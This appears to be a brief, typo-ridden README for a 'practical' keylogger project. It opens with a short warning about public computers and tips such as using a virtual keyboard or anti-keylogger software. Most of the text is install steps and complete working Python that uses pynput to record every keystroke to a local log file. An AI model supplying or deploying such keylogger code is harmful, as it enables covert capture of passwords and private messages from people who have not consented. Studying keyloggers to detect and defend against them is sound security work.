# Keylogger-practical

keylogger 
store all what you type.

-->in cyber cafe and other public pc is dangerous for us..

--->be sahe use virtual keyboarf, update system,antikeyloger install.

1..in powershell after installation of python..
2..type pip install pynput


from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")
    
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = f"<{key[4:]}>"

    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press=log_keystroke) as listener:
    listener.join()

